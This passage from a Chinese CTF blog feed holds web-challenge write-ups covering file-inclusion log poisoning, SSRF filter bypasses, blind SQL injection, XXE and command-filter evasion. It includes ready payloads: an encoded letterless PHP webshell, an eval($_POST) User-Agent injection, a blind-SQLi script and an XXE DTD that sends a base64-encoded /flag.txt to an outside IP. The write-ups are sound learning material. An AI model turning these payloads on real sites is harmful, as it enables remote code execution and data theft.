27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b</code></pre><p>注意这两个payload利用的话要php版本小于7才能成功利用，</p><blockquote><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，<code>assert</code>不再是函数，变成了一个语言结构（类似<code>eval</code>），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用<code>file_put_contents</code>函数，同样可以用来<code>getshell</code>。</p></blockquote><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809170716430.png" alt loading="lazy"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li><li><a href="https://xz.aliyun.com/t/7181">通过一道代码审计题目来练习无数字字母构造webshell</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    
    
    <entry>
      <title>CTFSHOW-WEB_AK赛</title>
      <link href="/posts/f7521cf/"/>
      <url>/posts/f7521cf/</url>
      
        <content type="html"><![CDATA[<p>在菜鸡的道路上越走越远。。。淦！</p><a id="more"></a><h3 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    if(preg_match(&#39;&#x2F;php&#x2F;i&#39;, $file))&#123;        die(&#39;error&#39;);    &#125;else&#123;        include($file);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p><code>?file=/flag.txt</code>直接出答案。。这算个非预期解吧</p><p>另外的解法：文件包含Nginx日志文件、</p><p><code>?file=/var/log/nginx/access.log</code>可读日志文件内容，里面包含用户访问的UA信息</p><p>于是</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200803211650015.png" alt loading="lazy"></p><p>尝试命令执行</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK赛/image-20200803211626102.png" alt="image-20200803211626102" loading="lazy"><p>随后<code>cat /flag.txt</code>即可</p><h3 id="Web1-观字"><a href="#Web1-观字" class="headerlink" title="Web1_观字"></a>Web1_观字</h3><p>题目给出源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php#flag in http:&#x2F;&#x2F;192.168.7.68&#x2F;flagif(isset($_GET[&#39;url&#39;]))&#123;    $url &#x3D; $_GET[&#39;url&#39;];    $protocol &#x3D; substr($url, 0,7);    if($protocol!&#x3D;&#39;http:&#x2F;&#x2F;&#39;)&#123;        die(&#39;仅限http协议访问&#39;);    &#125;    if(preg_match(&#39;&#x2F;\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\&#96;|\~|\+|\&#39;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0&#x2F;&#39;, $url))&#123;        die(&#39;仅限域名地址访问&#39;);    &#125;    system(&#39;curl &#39;.$url);&#125;</code></pre><p><code>payload</code>：<code>/?url=http://192。168。7。68/flag</code></p><p>原因是curl中可以用<code>。</code>替换<code>.</code></p><p>另外，ip可以使用十进制进行访问，即<code>http://3232237380/flag</code>，但题目过滤了0</p><h3 id="Web2-观星"><a href="#Web2-观星" class="headerlink" title="Web2_观星"></a>Web2_观星</h3><p>url可以给id传值，当传入一个引号的时候回显<code>enheng?</code>，推测sql注入</p><p>FUZZ测试发现过滤了以下的内容（长度为533的）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200801213125358.png" alt loading="lazy"></p><p>未过滤<code>^</code>，考虑布尔盲注</p><p>payload：</p><p><code>id=1^case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end.format(i,j)</code></p><p>过滤了逗号，<code>if</code>无法使用则用<code>case...when...then...else...end</code>代替绕过，<code>substr</code>中的逗号用<code>substr(...from...for...)</code>代替绕过</p><p>接下来就可以写脚本了</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &#39;http:&#x2F;&#x2F;dc894a39-ba77-4e9f-9201-e52d7a19ba5c.chall.ctf.show&#x2F;index.php?id&#x3D;1^&#39;# payload &#x3D; &#39;case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;   web1# payload &#x3D; &#39;case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database())))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;    flag,page,user# payload &#x3D; &#39;case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp(0x666C6167)))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;    FLAG_COLUMN,flagpayload &#x3D; &#39;case(ord(substr((select(flag)from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;flag &#x3D; &#39;&#39;for i in range(1, 128):    for j in range(38, 126):        urls &#x3D; url+payload.format(i, j)        request &#x3D; requests.get(urls)        if &#39;I asked nothing&#39; in request.text:            flag +&#x3D; chr(j)            print(flag)            break</code></pre><h3 id="Web3-观图"><a href="#Web3-观图" class="headerlink" title="Web3_观图"></a>Web3_观图</h3><p>showImage.php可看到源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;$key &#x3D; substr(md5(&#39;ctfshow&#39;.rand()),3,8);&#x2F;&#x2F;flag in config.phpinclude(&#39;config.php&#39;);if(isset($_GET[&#39;image&#39;]))&#123;    $image&#x3D;$_GET[&#39;image&#39;];    $str &#x3D; openssl_decrypt($image, &#39;bf-ecb&#39;, $key);    if(file_exists($str))&#123;        header(&#39;content-type:image&#x2F;gif&#39;);        echo file_get_contents($str);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>图片链接为<code>/showImage.php?image=Z6Ilu83MIDw=</code></p><p>可以看到图片文件名是<code>Z6Ilu83MIDw=</code>经过<code>bf-ecb</code>算法用<code>$key</code>得到的，再看<code>$key</code>的生成方式</p><pre class="language-php" data-language="php"><code class="language-php">substr(md5(&#39;ctfshow&#39;.rand()),3,8);</code></pre><p>查询<code>rand()</code>函数，若里面的参数为空，则返回<code>0</code>到<code>getrandmax()</code>之间的伪随机整数</p><p><code>getrandmax()</code>函数返回随机数可能返回的最大值，既然有上限即可进行爆破来得出<code>key</code>值</p><p>脚本如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    for($i&#x3D;0;$i&lt;getrandmax();$i++)&#123;        $key &#x3D; substr(md5(&#39;ctfshow&#39;.$i),3,8);  &#x2F;&#x2F;5a78dbb4        $image&#x3D;&quot;Z6Ilu83MIDw&#x3D;&quot;;        $str &#x3D; openssl_decrypt($image, &#39;bf-ecb&#39;, $key);        if(strpos($str,&quot;gif&quot;) or strpos($str,&quot;jpg&quot;) or strpos($str,&quot;png&quot;))&#123;            print($str.&quot;\n&quot;);            print($i.&quot;\n&quot;);            print($key.&quot;\n&quot;);            break;        &#125;    &#125;    $flag &#x3D; openssl_encrypt(&#39;config.php&#39;, &#39;bf-ecb&#39;, &#39;5a78dbb4&#39;);    print($flag);</code></pre><p>得到<code>N6bf8Bd8jm0SpmTZGl0isw==</code>，为<code>config.php</code>加密后的<code>base64</code>码，访问<code>/showImage.php?image=N6bf8Bd8jm0SpmTZGl0isw==</code>，F12打开复制代码base64解密得到<code>config.php</code>的内容，<code>flag</code>即在其中。</p><h3 id="Web4-观心"><a href="#Web4-观心" class="headerlink" title="Web4_观心"></a>Web4_观心</h3><p>抓包发现有<code>api.php</code>文件，并且带有请求<code>api</code>和<code>city</code>两个数据</p><p><code>api</code>携带的是一个网址，是一个xml文件，由此判断考的应该是XXE外部实体注入</p><p>于是构建攻击环境</p><p>在公网服务器上编写两个文件</p><p>xxe.xml</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE root[    &lt;!ENTITY % dtd SYSTEM "http://ip/xxe.dtd">    %dtd;]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>woojay<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>xxe.dtd</p><pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.106.160.176:5000&#x2F;%file;&#39;&gt;&quot;&gt;%int;%send;</code></pre><p>随后在服务器上监听5000端口，即可得到<code>flag.txt</code>的 <code>base64</code>编码后的结果，解码既是flag</p><p>不监听端口也可以，直接发包请求，会把报错的结果返回，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200804113715125.png" alt loading="lazy"></p><p>XXE这块不是很了解，原理后面再仔细研究一下</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    
    
    <entry>
      <title>36D杯五道代码审计题</title>
      <link href="/posts/e53b958d/"/>
      <url>/posts/e53b958d/</url>
      
        <content type="html"><![CDATA[<p>“温故而知新，可以为师矣”——孔子《论语》</p><a id="more"></a><h3 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h3><p>访问<code>index.php.bak</code>得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">visit all_info_u_want.php and you will get all information you want&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:&lt;?phperror_reporting(0);&#x2F;&#x2F;give you all information you wantif (isset($_GET[&#39;all_info_i_want&#39;])) &#123;    phpinfo();&#125;if (isset($_GET[&#39;file&#39;])) &#123;    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];    &#x2F;&#x2F;really baby include    include($file);&#125;?&gt;really really really baby challenge right? </code></pre><p>根据源码提示传入<code>all_info_u_want.php?all_info_i_want</code>，得到<code>phpinfo()</code>的结果，<code>flag</code>并不在这里</p><p>传入<code>all_info_u_want.php?file=../../../../../../etc/passwd</code>，可以看到<code>/etc/passwd</code>的内容，目录穿越，再传入<code>all_info_u_want.php?file=../../../../../../flag</code>试图读取flag，得到信息如下：</p><p><code>flag&#123;this_is_fake_flag_realflag_is_in_/etc_find_it_by_yourself&#125;</code></p><p>根据提示可以知道flag应该在<code>etc</code>目录下，慢猜不好搞，没那个运气</p><p>先来看看用的是什么web服务器，抓包可以看到是<code>Nginx</code>服务器，尝试读取<code>Nginx</code>的敏感信息文件，网上查得<code>Nginx</code>的访问日志文件默认路径为<code>/var/log/nginx/access.log</code>，尝试读取，得到日志文件结果，该日志文件回保存访问的<code>User-Agent</code>的内容，结合文件包含，我们可以在<code>User-Agent</code>中注入恶意代码，从而<code>getshell</code>，</p><pre class="language-none"><code class="language-none">GET &#x2F;all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log HTTP&#x2F;1.1Host: 16636aaf-35bc-4ac1-993c-95897de4ec8e.chall.ctf.showUser-Agent: &lt;?php phpinfo();?&gt;</code></pre><p>成功执行php代码，于是传入<code>User-Agent: &lt;?php eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>利用pass反弹shell后执行<code>find etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</code>，得到flag</p><h3 id="WEB-WUSTCTF朴实无华Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge"></a>WEB_WUSTCTF朴实无华Revenge</h3><p>拿到题目得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpheader(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123;    $len&#x3D;strlen($str);    $l&#x3D;1;    $k&#x3D;intval($len&#x2F;2)+1;    for($j&#x3D;0;$j&lt;$k;$j++)        if (substr($str,$j,1)!&#x3D;substr($str,$len-$j-1,1)) &#123;            $l&#x3D;0;            break;        &#125;    if ($l&#x3D;&#x3D;1) return true;    else return false;&#125;&#x2F;&#x2F;level 1if (isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    $numPositve &#x3D; intval($num);  &#x2F;&#x2F; 获取变量的整数值    if ($num !&#x3D; $numPositve) &#123;        die(&#39;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#39;);    &#125;    $numReverse &#x3D; intval(strrev($num));  &#x2F;&#x2F; 反转字符串    if (preg_match(&#39;&#x2F;[^0-9.-]&#x2F;&#39;, $num)) &#123;        die(&quot;非洲欢迎你1&quot;);    &#125;    if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999) &#123; &#x2F;&#x2F;在64位系统中 intval()的上限不是2147483647 省省吧        die(&quot;非洲欢迎你2&quot;);    &#125;    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num))&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧1&quot;);&#125;&#x2F;&#x2F;level 2if (isset($_GET[&#39;md5&#39;]))&#123;    $md5&#x3D;$_GET[&#39;md5&#39;];    if ($md5&#x3D;&#x3D;md5(md5($md5)))        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;    else        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;get flagif (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;</code></pre><p>先一层层绕过，首先第一个<code>if</code>，传入num，简单来说就是</p><ul><li>num结果取整后和原来的字符串需要相等，但是这里只需要<code>==</code>即可</li><li>num需要为数字，取整后的数字不能小于-999999999999999999或者大于999999999999999999</li><li>num在经过取整和反转字符串后取整后的数字需要相等</li><li>num经过<code>isPalindrome</code>函数返回的值需要为<code>false</code></li></ul><p>再来看看<code>isPalindrome</code>函数，字符串两边对称的数字需要有不一样，才能使<code>$l=0</code>，返回<code>false</code>这样与前面的条件就矛盾了，反转后又需要相等，又不能对称。</p><p>以下提供两种绕过方式：</p><pre class="language-none"><code class="language-none">00.01000000000000000.00000000000000010</code></pre><p>第一种确实是没有任何操作就直接绕过了，而第二种则是浮点数的精度问题，在服务器上</p><p><code>var_dump(intval(1000000000000000.00000000000000010) === intval(strrev(1000000000000000.00000000000000010)));</code></p><p>是可以返回true的，但是我在本地测试到</p><p><code>var_dump(intval(1000000.00000010) === intval(strrev(1000000.00000010)));</code></p><p>就返回false了，不知道什么鬼-.-</p><p>再绕过第二个if</p><p>这个需要让<code>$md5==md5(md5($md5))</code>，弱比较，绕如果md5=0exxxxxxxx，经过两次md5加密后的md5值也为0exxxxxxxx，即可绕过</p><p>写个脚本爆破即可，这样的字符串挺多的，以下列举几个：</p><pre class="language-none"><code class="language-none">0e3900184182-&gt;0e1418721190302697727652753637950e6201668706-&gt;0e7985422574949326206502419486330e6702291282-&gt;0e1005063503807650968114418218160e1808236718-&gt;0e9355671365452205537103932527520e9507776345-&gt;0e8846062744707241436539484045430e7208324299-&gt;0e0296373600831971546521412019920e2010692162-&gt;0e5148989988791743362037461270580e9410970854-&gt;0e4302790236499053907065604760830e3511282263-&gt;0e657335831331991043075342997270</code></pre><p>再到最后get flag</p><p>过滤了挺多的命令，但是还是可以绕过：</p><pre class="language-shell" data-language="shell"><code class="language-shell">nl&lt;&#x2F;flag|nlrev&lt;&#x2F;flag|rev</code></pre><p>随后即可拿到flag</p><h3 id="WEB-WUSTCTF朴实无华Revenge-Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge-Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge_Revenge"></a>WEB_WUSTCTF朴实无华Revenge_Revenge</h3><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpheader(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123;    $len&#x3D;strlen($str);    $l&#x3D;1;    $k&#x3D;intval($len&#x2F;2)+1;    for($j&#x3D;0;$j&lt;$k;$j++)        if (substr($str,$j,1)!&#x3D;substr($str,$len-$j-1,1)) &#123;            $l&#x3D;0;            break;        &#125;    if ($l&#x3D;&#x3D;1) return true;    else return false;&#125;&#x2F;&#x2F;level 1if (isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    $numPositve &#x3D; intval($num);    $numReverse &#x3D; intval(strrev($num));    if (preg_match(&#39;&#x2F;[^0-9.]&#x2F;&#39;, $num)) &#123;        die(&quot;非洲欢迎你1&quot;);    &#125; else &#123;        if ( (preg_match_all(&quot;&#x2F;\.&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\-&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\-&#x2F;&quot;, $num)&#x3D;&#x3D;1 &amp;&amp; !preg_match(&#39;&#x2F;^[-]&#x2F;&#39;, $num))) &#123;            die(&quot;没有这样的数&quot;);        &#125;    &#125;    if ($num !&#x3D; $numPositve) &#123;        die(&#39;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#39;);    &#125;    if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999) &#123; &#x2F;&#x2F;在64位系统中 intval()的上限不是2147483647 省省吧        die(&quot;非洲欢迎你2&quot;);    &#125;    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;level 2if (isset($_GET[&#39;md5&#39;]))&#123;    $md5&#x3D;$_GET[&#39;md5&#39;];    if ($md5&#x3D;&#x3D;md5(md5($md5)))        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;    else        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;get flagif (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);        if (preg_match(&quot;&#x2F;[&#39;\*\&quot;[?]&#x2F;&quot;, $get_flag)) &#123;            die(&#39;非预期修复*2&#39;);        &#125;        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;</code></pre><p>这题和上题差不多，只是最后的命令多过滤了一些，直接给出payload：</p><pre class="language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e2010692162&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</code></pre><h3 id="WEB-你取吧"><a href="#WEB-你取吧" class="headerlink" title="WEB_你取吧"></a>WEB_你取吧</h3><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);show_source(__FILE__);$hint&#x3D;file_get_contents(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hhh.php&#39;);$code&#x3D;$_REQUEST[&#39;code&#39;];$_&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;m&#39;,&#39;n&#39;,&#39;l&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;\~&#39;,&#39;\^&#39;);$blacklist &#x3D; array_merge($_);foreach ($blacklist as $blacklisted) &#123;    if (preg_match (&#39;&#x2F;&#39; . $blacklisted . &#39;&#x2F;im&#39;, $code)) &#123;        die(&#39;nonono&#39;);    &#125;&#125;eval(&quot;echo($code);&quot;);?&gt;</code></pre><p>直接给出P神的payload(无字母数字的RCE)：</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p>GET：</p><pre class="language-php" data-language="php"><code class="language-php">?code&#x3D;%22%22%29%3b%24%5f%3d%5b%5d%3b%24%5f%3d%40%22%24%5f%22%3b%24%5f%3d%24%5f%5b%27%21%27%3d%3d%27%40%27%5d%3b%24%5f%5f%5f%3d%24%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%